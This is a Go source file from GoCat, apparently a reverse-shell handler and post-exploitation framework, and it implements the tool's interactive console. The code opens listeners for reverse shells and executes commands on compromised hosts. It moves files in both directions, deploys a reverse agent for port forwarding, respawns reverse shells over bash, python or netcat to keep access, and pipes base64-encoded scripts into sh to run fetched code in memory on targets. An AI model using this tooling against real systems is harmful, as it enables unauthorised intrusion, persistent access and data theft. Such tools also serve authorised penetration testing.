package cmd

import (
	"encoding/base64"
	"fmt"
	"io"
	"net"
	"net/http"
	"os"
	"os/exec"
	"runtime"
	"sort"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/realibrahimsql/Gocat/internal/logger"
	"github.com/realibrahimsql/Gocat/internal/modules"
	"github.com/realibrahimsql/Gocat/internal/readline"
	"github.com/realibrahimsql/Gocat/internal/session"
	"github.com/realibrahimsql/Gocat/internal/shell"
	"github.com/spf13/cobra"
)

type consoleListener struct {
	id       int
	host     string
	port     int
	listener net.Listener
}

var (
	consoleListenersMu sync.RWMutex
	consoleListeners   = map[int]*consoleListener{}
	nextConsoleLID     int
)

// consoleSettings holds SET-able console configuration
var consoleSettings = map[string]string{
	"lhost":        "",
	"lport":        "4444",
	"auto_upgrade": "true",
	"maintain":     "1",
	"max_sessions": "5",
}

var consoleCmd = &cobra.Command{
	Use:     "console",
	Aliases: []string{"menu", "repl"},
	Short:   "Start an interactive session console",
	Long: `Start an interactive console for listener and session management.

Console commands include listen, listeners, sessions, interact/use, exec,
script, open, connect, upgrade, agent, portfwd, modules, run, payloads,
spawn, maintain, upload, download, set, kill, and killall.`,
	Run: func(cmd *cobra.Command, args []string) {
		runConsole()
	},
}

func init() {
	rootCmd.AddCommand(consoleCmd)
}

func consolePrompt() string {
	count := session.DefaultManager.SessionCount()
	if count == 0 {
		return "(GoCat)> "
	}
	attached := session.DefaultManager.AttachedSession
	if attached != nil {
		return fmt.Sprintf("(GoCat|%d sessions|*%d)> ", count, attached.ID)
	}
	return fmt.Sprintf("(GoCat|%d sessions)> ", count)
}

func consoleCommands() []string {
	return []string{
		"help", "exit", "quit", "clear",
		"listen", "listeners", "connect", "interfaces",
		"sessions", "ls", "list", "info",
		"interact", "use", "attach", "detach",
		"kill", "killall",
		"upgrade", "exec", "script", "open",
		"upload", "download",
		"agent", "portfwd", "forward",
		"spawn",
		"modules", "run", "info", "search",
		"payloads", "payload",
		"set", "show",
		"maintain",
	}
}

func runConsole() {
	listenSessionMode = true
	listenAutoUpgrade = true
	listenNoAttach = true

	// Set default lhost
	if consoleSettings["lhost"] == "" {
		consoleSettings["lhost"] = getDefaultIP()
	}

	theme := logger.GetCurrentTheme()
	theme.Highlight.Print("\nGoCat Interactive Console\n\n")
	fmt.Println("Type 'help' for commands, 'exit' to quit.")
	fmt.Printf("Default LHOST: %s\n\n", consoleSettings["lhost"])

	editor := readline.NewEditor()
	editor.SetPrompt(consolePrompt())
	editor.EnableAutoSuggestion(false)
	if homeDir, err := os.UserHomeDir(); err == nil {
		editor.SetHistoryFile(homeDir + "/.gocat_console_history")
	}
	editor.SetCompletions(consoleCommands())
	editor.SetCompletionFunction(func(line string) []string {
		prefix := strings.ToLower(strings.TrimSpace(line))
		if strings.Contains(prefix, " ") {
			return nil
		}
		var matches []string
		for _, cmd := range consoleCommands() {
			if strings.HasPrefix(cmd, prefix) {
				matches = append(matches, cmd)
			}
		}
		return matches
	})

	for {
		editor.SetPrompt(consolePrompt())
		line, err := editor.Readline()
		if err != nil {
			if err == readline.ErrTerminated || err == io.EOF {
				fmt.Println()
				return
			}
			// Ctrl+C cancels the current line instead of quitting.
			fmt.Println()
			continue
		}
		line = strings.TrimSpace(line)
		if line == "" {
			continue
		}
		editor.AddHistoryEntry(line)
		if !handleConsoleCommand(line) {
			return
		}
	}
}

func handleConsoleCommand(line string) bool {
	fields := strings.Fields(line)
	if len(fields) == 0 {
		return true
	}

	cmd := strings.ToLower(fields[0])
	args := fields[1:]

	switch cmd {
	case "help", "?":
		printConsoleHelp()
	case "clear", "cls":
		fmt.Print("\033[2J\033[H")
	case "exit", "quit":
		stopConsoleListeners()
		session.DefaultManager.StopAll()
		return false
	case "listen":
		consoleListen(args)
	case "connect":
		consoleConnect(args)
	case "interfaces":
		consoleInterfaces()
	case "listeners":
		consoleListListeners()
	case "sessions", "session", "ls", "list":
		fmt.Println(session.DefaultManager.SessionsTable())
	case "info":
		consoleInfo(args)
	case "search":
		consoleSearchModules(args)
	case "interact", "use", "attach":
		if id, ok := parseConsoleID(args); ok {
			if err := session.DefaultManager.InteractSession(id); err != nil {
				logger.Error("Interaction failed: %v", err)
			}
		}
	case "detach":
		session.DefaultManager.DetachSession()
	case "kill":
		if id, ok := parseConsoleID(args); ok {
			session.DefaultManager.RemoveSession(id)
			logger.Info("Session %d killed", id)
		}
	case "killall":
		session.DefaultManager.StopAll()
	case "upgrade":
		consoleUpgrade(args)
	case "exec":
		consoleExec(args)
	case "script":
		consoleScript(args)
	case "open":
		consoleOpen(args)
	case "upload":
		consoleUpload(args)
	case "download":
		consoleDownload(args)
	case "agent":
		consoleAgent(args)
	case "portfwd", "pf", "forward":
		consolePortForward(args)
	case "modules":
		fmt.Println(modules.DefaultRegistry.FormatModuleList())
	case "run":
		consoleRunModule(args)
	case "payloads", "payload", "hints":
		consolePayloads(args)
	case "spawn":
		consoleSpawn(args)
	case "maintain":
		consoleMaintain(args)
	case "set":
		consoleSet(args)
	case "show":
		consoleShow(args)
	default:
		logger.Error("Unknown command: %s  (type 'help')", cmd)
	}

	return true
}

func printConsoleHelp() {
	fmt.Println(`
  Session Management

   clear                                Clear the screen
   listen [host] <port>                 Start a reverse-shell listener
   connect <host> <port>                Connect to a bind shell
   interfaces                            Show local network interfaces
   listeners                            Show active console listeners
   sessions | ls                        List sessions
   info <id>|<module>                   Session details or module info
   search <term>                        Search post-exploitation modules
   interact|use <id>                    Attach (F12/Ctrl+] detaches, Ctrl+C forwarded)
   detach                               Detach from current session
   kill <id> | killall                  Remove sessions
   clear                               Clear the screen

  Session Operations

   exec <id> <command>                  Execute a command through the session
   script <id> <file|URL>              Run a local/remote script in memory (Unix)
   open <id> <remote_path> [dir]        Download a remote file and open it locally
   upgrade <id> [auto|python|script]    Upgrade Unix raw shell to PTY
  upload <id> <local_file> [remote]    Upload file to session target
  download <id> <remote_path> [dir]    Download file from session target
  spawn <id>                           Spawn a new reverse shell from session
  maintain <id> [N]                    Keep N sessions alive per host (default 1)

  Agent & Tunneling

  agent <id> [lhost] [lport]           Deploy Python reverse agent
  portfwd <id> <lport> <rhost:rport>   Forward local TCP through agent

  Modules & Payloads

  modules                              List post-exploitation modules
  run <module> <id> [args...]          Run a module
  payloads [host] [port]               Print reverse-shell payloads

   Configuration

   set <key> <value>                    Set a console variable
   show [settings|listeners|sessions]   Show current state
   help | ?                             This help
   exit                                 Stop listeners and quit

   Shortcuts

   Ctrl+C                               Cancel current line (console stays open)
   Ctrl+D (empty line)                  Quit console
   Ctrl+R                               Reverse history search
   Ctrl+L                               Clear screen
   Ctrl+A / Ctrl+E                      Line start / end
   Ctrl+U / Ctrl+K / Ctrl+W             Kill line / to end / word back
   Ctrl+Y                               Yank killed text
   Tab                                  Completion
   F12 or Ctrl+] (in session)           Detach, Ctrl+C forwarded to remote`)
}

func consoleListen(args []string) {
	if len(args) < 1 || len(args) > 2 {
		logger.Error("Usage: listen [host] <port>")
		return
	}

	host := "0.0.0.0"
	portText := args[0]
	if len(args) == 2 {
		host = args[0]
		portText = args[1]
	}
	port, err := strconv.Atoi(portText)
	if err != nil || port < 1 || port > 65535 {
		logger.Error("Invalid port: %s", portText)
		return
	}

	ln, err := net.Listen("tcp", net.JoinHostPort(host, portText))
	if err != nil {
		logger.Error("Listen failed: %v", err)
		return
	}

	consoleListenersMu.Lock()
	nextConsoleLID++
	id := nextConsoleLID
	consoleListeners[id] = &consoleListener{id: id, host: host, port: port, listener: ln}
	consoleListenersMu.Unlock()
	session.DefaultManager.AddListener(host, port)

	logger.Info("Listener [%d] active on %s", id, ln.Addr())
	go func() {
		for {
			conn, err := ln.Accept()
			if err != nil {
				return
			}
			go handleSessionConnection(conn)
		}
	}()
}

func consoleListListeners() {
	consoleListenersMu.RLock()
	defer consoleListenersMu.RUnlock()
	if len(consoleListeners) == 0 {
		fmt.Println("No active listeners")
		return
	}
	fmt.Printf("%-4s %-20s %-6s\n", "ID", "Host", "Port")
	fmt.Println(strings.Repeat("─", 34))
	for _, l := range consoleListeners {
		fmt.Printf("%-4d %-20s %-6d\n", l.id, l.host, l.port)
	}
}

func stopConsoleListeners() {
	consoleListenersMu.Lock()
	defer consoleListenersMu.Unlock()
	for id, l := range consoleListeners {
		_ = l.listener.Close()
		delete(consoleListeners, id)
	}
}

// consoleConnect dials a bind shell and manages it as a session.
func consoleConnect(args []string) {
	if len(args) != 2 {
		logger.Error("Usage: connect <host> <port>")
		return
	}
	if _, err := strconv.Atoi(args[1]); err != nil {
		logger.Error("Invalid port: %s", args[1])
		return
	}
	target := net.JoinHostPort(args[0], args[1])
	conn, err := net.DialTimeout("tcp", target, 10*time.Second)
	if err != nil {
		logger.Error("Connect to %s failed: %v", target, err)
		return
	}
	logger.Info("Connected to %s, determining shell type...", target)
	go handleSessionConnection(conn)
}

// consoleInterfaces prints local network interfaces.
func consoleInterfaces() {
	ifaces, err := net.Interfaces()
	if err != nil {
		logger.Error("Interfaces failed: %v", err)
		return
	}
	for _, iface := range ifaces {
		addrs, _ := iface.Addrs()
		var ips []string
		for _, a := range addrs {
			ips = append(ips, a.String())
		}
		fmt.Printf("%-10s %-6s %s\n", iface.Name, iface.Flags.String(), strings.Join(ips, ", "))
	}
}

// consoleInfo shows session details for numeric args and module details otherwise.
func consoleInfo(args []string) {
	if len(args) == 0 {
		logger.Error("Usage: info <session_id>|<module>")
		return
	}
	if id, err := strconv.Atoi(args[0]); err == nil {
		fmt.Println(session.DefaultManager.SessionInfo(id))
		return
	}
	fmt.Println(modules.DefaultRegistry.Describe(args[0]))
}

// consoleSearchModules searches modules by name/description/category.
func consoleSearchModules(args []string) {
	if len(args) == 0 {
		logger.Error("Usage: search <term>")
		return
	}
	fmt.Println(modules.DefaultRegistry.FormatSearch(strings.Join(args, " ")))
}

const maxScriptBytes = 8 << 20 // 8MB cap for script fetch

// consoleScript runs a local file or remote URL script in memory on the
// target without touching its disk (Unix only).
func consoleScript(args []string) {
	if len(args) != 2 {
		logger.Error("Usage: script <id> <local_file|URL>")
		return
	}
	id, ok := parseConsoleID(args)
	if !ok {
		return
	}
	sess := session.DefaultManager.GetSession(id)
	if sess == nil {
		logger.Error("Session %d not found", id)
		return
	}
	if sess.OS != session.OSUnix {
		logger.Error("script is supported on Unix sessions only")
		return
	}

	source := args[1]
	var content []byte
	if strings.HasPrefix(source, "http://") || strings.HasPrefix(source, "https://") {
		resp, err := http.Get(source)
		if err != nil {
			logger.Error("Script download failed: %v", err)
			return
		}
		defer resp.Body.Close()
		content, err = io.ReadAll(io.LimitReader(resp.Body, maxScriptBytes+1))
		if err != nil {
			logger.Error("Script read failed: %v", err)
			return
		}
	} else {
		var err error
		content, err = os.ReadFile(source)
		if err != nil {
			logger.Error("Script read failed: %v", err)
			return
		}
	}
	if len(content) == 0 {
		logger.Error("Empty script, nothing to run")
		return
	}
	if len(content) > maxScriptBytes {
		logger.Error("Script exceeds %d bytes, refusing", maxScriptBytes)
		return
	}

	encoded := base64.StdEncoding.EncodeToString(content)
	out, err := sess.Exec(fmt.Sprintf("echo %s | base64 -d | sh", encoded), 30*time.Second)
	if err != nil {
		logger.Error("Script failed: %v", err)
		return
	}
	fmt.Println(out)
}

// consoleOpen downloads a remote file and opens it with the local default application.
func consoleOpen(args []string) {
	if len(args) < 2 || len(args) > 3 {
		logger.Error("Usage: open <id> <remote_path> [local_dir]")
		return
	}
	id, ok := parseConsoleID(args)
	if !ok {
		return
	}
	sess := session.DefaultManager.GetSession(id)
	if sess == nil {
		logger.Error("Session %d not found", id)
		return
	}
	localDir := ""
	if len(args) > 2 {
		localDir = args[2]
	}
	path, err := sess.Download(args[1], localDir)
	if err != nil {
		logger.Error("Download failed: %v", err)
		return
	}
	var opener string
	var openArgs []string
	switch runtime.GOOS {
	case "darwin":
		opener = "open"
	case "windows":
		opener = "cmd"
		openArgs = []string{"/c", "start", "", path}
	default:
		opener = "xdg-open"
	}
	if runtime.GOOS != "windows" {
		openArgs = []string{path}
	}
	if out, err := exec.Command(opener, openArgs...).CombinedOutput(); err != nil {
		logger.Warn("Downloaded to %s (auto-open failed: %v %s)", path, err, strings.TrimSpace(string(out)))
		return
	}
	logger.Info("Opened: %s", path)
}

func parseConsoleID(args []string) (int, bool) {
	if len(args) == 0 {
		logger.Error("Missing session ID")
		return 0, false
	}
	id, err := strconv.Atoi(args[0])
	if err != nil {
		logger.Error("Invalid session ID: %s", args[0])
		return 0, false
	}
	return id, true
}

func consoleUpgrade(args []string) {
	id, ok := parseConsoleID(args)
	if !ok {
		return
	}
	sess := session.DefaultManager.GetSession(id)
	if sess == nil {
		logger.Error("Session %d not found", id)
		return
	}

	method := shell.MethodAuto
	if len(args) > 1 {
		method = shell.UpgradeMethod(strings.ToLower(args[1]))
	}
	result := shell.Upgrade(sess, method)
	if result.Success {
		logger.Info("Session %d upgraded via %s", id, result.Method)
	} else {
		logger.Error("Upgrade failed: %v", result.Error)
	}
}

func consoleExec(args []string) {
	id, ok := parseConsoleID(args)
	if !ok || len(args) < 2 {
		logger.Error("Usage: exec <id> <command>")
		return
	}
	sess := session.DefaultManager.GetSession(id)
	if sess == nil {
		logger.Error("Session %d not found", id)
		return
	}
	resp, err := sess.Exec(strings.Join(args[1:], " "), 10*time.Second)
	if err != nil {
		logger.Error("Exec failed: %v", err)
		return
	}
	fmt.Println(resp)
}

func consoleUpload(args []string) {
	if len(args) < 2 || len(args) > 3 {
		logger.Error("Usage: upload <id> <local_file> [remote_path]")
		return
	}
	id, ok := parseConsoleID(args)
	if !ok {
		return
	}
	sess := session.DefaultManager.GetSession(id)
	if sess == nil {
		logger.Error("Session %d not found", id)
		return
	}
	remotePath := ""
	if len(args) > 2 {
		remotePath = args[2]
	}
	path, err := sess.Upload(args[1], remotePath)
	if err != nil {
		logger.Error("Upload failed: %v", err)
		return
	}
	logger.Info("Uploaded to: %s", path)
}

func consoleDownload(args []string) {
	if len(args) < 2 || len(args) > 3 {
		logger.Error("Usage: download <id> <remote_path> [local_dir]")
		return
	}
	id, ok := parseConsoleID(args)
	if !ok {
		return
	}
	sess := session.DefaultManager.GetSession(id)
	if sess == nil {
		logger.Error("Session %d not found", id)
		return
	}
	localDir := ""
	if len(args) > 2 {
		localDir = args[2]
	}
	path, err := sess.Download(args[1], localDir)
	if err != nil {
		logger.Error("Download failed: %v", err)
		return
	}
	logger.Info("Downloaded to: %s", path)
}

func consoleAgent(args []string) {
	id, ok := parseConsoleID(args)
	if !ok {
		return
	}
	host := consoleSettings["lhost"]
	port := 0
	if len(args) > 1 {
		host = args[1]
	}
	if len(args) > 2 {
		parsed, err := strconv.Atoi(args[2])
		if err != nil {
			logger.Error("Invalid agent port: %s", args[2])
			return
		}
		port = parsed
	}
	sess := session.DefaultManager.GetSession(id)
	if sess == nil {
		logger.Error("Session %d not found", id)
		return
	}
	if err := sess.StartAgent(host, port, 15*time.Second); err != nil {
		logger.Error("Agent failed: %v", err)
	}
}

func consolePortForward(args []string) {
	if len(args) != 3 {
		logger.Error("Usage: portfwd <id> <local_port> <remote_host:remote_port>")
		return
	}
	id, ok := parseConsoleID(args)
	if !ok {
		return
	}
	localPort, err := strconv.Atoi(args[1])
	if err != nil {
		logger.Error("Invalid local port: %s", args[1])
		return
	}
	remote := args[2]
	if _, _, err := net.SplitHostPort(remote); err != nil {
		logger.Error("Remote target must be host:port: %v", err)
		return
	}
	sess := session.DefaultManager.GetSession(id)
	if sess == nil {
		logger.Error("Session %d not found", id)
		return
	}
	if !sess.AgentActive {
		if err := sess.StartAgent("", 0, 15*time.Second); err != nil {
			logger.Error("Agent failed: %v", err)
			return
		}
	}
	go func() {
		if err := runSessionPortForward(sess, localPort, remote); err != nil {
			logger.Error("Port forward stopped: %v", err)
		}
	}()
	logger.Info("Port forward %d -> %s started in background", localPort, remote)
}

func consoleRunModule(args []string) {
	if len(args) < 2 {
		logger.Error("Usage: run <module> <id> [args...]")
		return
	}
	id, err := strconv.Atoi(args[1])
	if err != nil {
		logger.Error("Invalid session ID: %s", args[1])
		return
	}
	sess := session.DefaultManager.GetSession(id)
	if sess == nil {
		logger.Error("Session %d not found", id)
		return
	}
	modArgs := ""
	if len(args) > 2 {
		modArgs = strings.Join(args[2:], " ")
	}
	if err := modules.DefaultRegistry.Run(args[0], sess, modArgs); err != nil {
		logger.Error("Module error: %v", err)
	}
}

func consolePayloads(args []string) {
	host := consoleSettings["lhost"]
	port := consoleSettings["lport"]
	if len(args) > 0 {
		host = args[0]
	}
	if len(args) > 1 {
		port = args[1]
	}
	theme := logger.GetCurrentTheme()
	for _, p := range generatePayloads(host, port) {
		printPayload(p, theme)
	}
}

func consoleSpawn(args []string) {
	id, ok := parseConsoleID(args)
	if !ok {
		return
	}
	sess := session.DefaultManager.GetSession(id)
	if sess == nil {
		logger.Error("Session %d not found", id)
		return
	}

	lhost := consoleSettings["lhost"]
	lport := consoleSettings["lport"]
	if len(args) > 1 {
		lhost = args[1]
	}
	if len(args) > 2 {
		lport = args[2]
	}

	portInt, err := strconv.Atoi(lport)
	if err != nil {
		logger.Error("Invalid port: %s", lport)
		return
	}

	payloads := shell.SpawnShellCommands(lhost, portInt)

	// Try based on available binaries
	tryOrder := []string{"bash", "bash_bg", "python", "nc_pipe", "nc_e"}
	for _, method := range tryOrder {
		cmd, exists := payloads[method]
		if !exists {
			continue
		}
		if method == "python" && !hasBinaryOnSession(sess, "python3") && !hasBinaryOnSession(sess, "python") {
			continue
		}
		if method == "bash" || method == "bash_bg" {
			if !hasBinaryOnSession(sess, "bash") {
				continue
			}
		}
		if (method == "nc_pipe" || method == "nc_e") && !hasBinaryOnSession(sess, "nc") {
			continue
		}

		logger.Info("Spawning new shell via %s to %s:%s ...", method, lhost, lport)
		_, _ = sess.Send([]byte(cmd + " &\n"))
		return
	}

	logger.Error("No suitable spawn method found. Ensure listener is running on %s:%s", lhost, lport)
}

func hasBinaryOnSession(sess *session.Session, name string) bool {
	_, ok := sess.Binaries[name]
	return ok
}

func consoleMaintain(args []string) {
	if len(args) == 0 {
		logger.Info("Current maintain count: %d", session.DefaultManager.Maintain)
		return
	}
	if len(args) == 1 {
		n, err := strconv.Atoi(args[0])
		if err != nil || n < 1 {
			logger.Error("Invalid maintain count: %s", args[0])
			return
		}
		session.DefaultManager.Maintain = n
		consoleSettings["maintain"] = args[0]
		installRespawnHook()
		logger.Info("Maintain set to %d sessions per host", n)
		return
	}
	logger.Error("Usage: maintain [N]")
}

func installRespawnHook() {
	session.DefaultManager.RespawnFn = func(hostName string, remaining []*session.Session) {
		if len(remaining) == 0 {
			return
		}
		sess := remaining[0]
		lhost := consoleSettings["lhost"]
		lport := consoleSettings["lport"]
		portInt, err := strconv.Atoi(lport)
		if err != nil {
			return
		}
		payloads := shell.SpawnShellCommands(lhost, portInt)
		for _, method := range []string{"bash_bg", "python", "nc_pipe"} {
			cmd, exists := payloads[method]
			if !exists {
				continue
			}
			if method == "python" && !hasBinaryOnSession(sess, "python3") && !hasBinaryOnSession(sess, "python") {
				continue
			}
			if (method == "bash_bg") && !hasBinaryOnSession(sess, "bash") {
				continue
			}
			if (method == "nc_pipe") && !hasBinaryOnSession(sess, "nc") {
				continue
			}
			logger.Info("Maintain: respawning shell for %s via %s", hostName, method)
			_, _ = sess.Send([]byte(cmd + " &\n"))
			return
		}
		logger.Warn("Maintain: no spawn method available for %s", hostName)
	}
}

func consoleSet(args []string) {
	if len(args) < 2 {
		logger.Error("Usage: set <key> <value>")
		fmt.Println("Available keys:", settingKeys())
		return
	}
	key := strings.ToLower(args[0])
	value := strings.Join(args[1:], " ")

	if _, exists := consoleSettings[key]; !exists {
		logger.Error("Unknown setting: %s", key)
		fmt.Println("Available keys:", settingKeys())
		return
	}

	consoleSettings[key] = value
	logger.Info("Set %s = %s", key, value)

	// Apply side effects
	switch key {
	case "auto_upgrade":
		listenAutoUpgrade = value == "true" || value == "1" || value == "yes"
	case "maintain":
		if n, err := strconv.Atoi(value); err == nil {
			session.DefaultManager.Maintain = n
		}
	case "max_sessions":
		if n, err := strconv.Atoi(value); err == nil {
			session.DefaultManager.MaxSessions = n
		}
	}
}

func consoleShow(args []string) {
	what := "settings"
	if len(args) > 0 {
		what = strings.ToLower(args[0])
	}

	switch what {
	case "settings", "config", "options":
		fmt.Printf("\n%-15s %s\n", "Setting", "Value")
		fmt.Println(strings.Repeat("─", 40))
		keys := settingKeySlice()
		for _, k := range keys {
			fmt.Printf("%-15s %s\n", k, consoleSettings[k])
		}
		fmt.Println()
	case "listeners":
		consoleListListeners()
	case "sessions":
		fmt.Println(session.DefaultManager.SessionsTable())
	default:
		fmt.Println("Usage: show [settings|listeners|sessions]")
	}
}

func settingKeys() string {
	return strings.Join(settingKeySlice(), ", ")
}

func settingKeySlice() []string {
	keys := make([]string, 0, len(consoleSettings))
	for k := range consoleSettings {
		keys = append(keys, k)
	}
	sort.Strings(keys)
	return keys
}
